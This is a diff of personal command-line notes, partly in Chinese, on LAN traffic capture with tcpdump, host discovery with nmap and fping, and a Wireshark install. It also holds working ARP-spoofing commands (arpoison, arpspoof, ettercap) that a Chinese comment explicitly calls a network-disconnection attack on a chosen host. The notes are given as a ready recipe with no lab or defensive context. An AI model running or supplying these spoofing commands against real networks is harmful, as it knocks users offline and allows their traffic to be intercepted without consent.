@@ -7,15 +7,14 @@ sudo aa-complain /usr/sbin/tcpdump
 
 
 tcpdump -i eth0 -nn 'host 192.168.2.249' -w check.cap
-tcpdump -i eth0 -nn 'host 192.168.2.246'
+tcpdump -i eth0 -nn 'host 192.168.2.246' -w check.cap
 tcpdump  -p arp
 
-nmap -sP 192.168.2.0/24
-
-tcpdump host 192.168.2.1
+nmap -sP 192.168.2.0/24 
+tcpdump host 192.168.2.1 -w check.cap
 
 抓取网口eth0上源mac地址或目的mac地址为00:21:85:6C:D9:A3的所有数据包
-tcpdump -i eth0 ether src or dst 34:97:f6:99:a1:ed
+tcpdump -i eth0 ether src or dst 34:97:f6:99:a1:ed -w check.cap
 
 sudo tcpdump -n -r arp_check222.cap|awk -F '[,]+' '{print $2}'|sort|uniq -c|sort -n
 
@@ -51,4 +50,16 @@ sudo arpoison -i eth0 -d 192.168.1.1 -s 192.168.1.101 -t ff:ff:ff:ff:ff:ff -r 00
 sudo arpoison -i eth0 -d 192.168.1.50 -s 192.168.1.1 -t ff:ff:ff:ff:ff:ff -r 00:1c:bf:03:9f:c7
 sudo arpoison -i enp4s0 -d 192.168.2.249 -s 192.168.2.1 -t ff:ff:ff:ff:ff:ff -r 1c:1b:0d:2d:94:87
 
+#install wireshark ubuntu16.04
+sudo apt-add-repository ppa:wireshark-dev/stable
+sudo apt-get update
+sudo apt-get install wireshark
+sudo dpkg-reconfigure wireshark-common
 
+#在一个局域网中，我们如果要对某个主机进行断网攻击的话，我们先要查看局域网中的ip。
+fping –asg 10.10.10.0/24
+
+arpspoof
+#进行断网攻击
+sudo arpspoof -i enp4s0 -t 192.168.2.252 192.168.2.254
+ettercap -Tq -i enp4s0
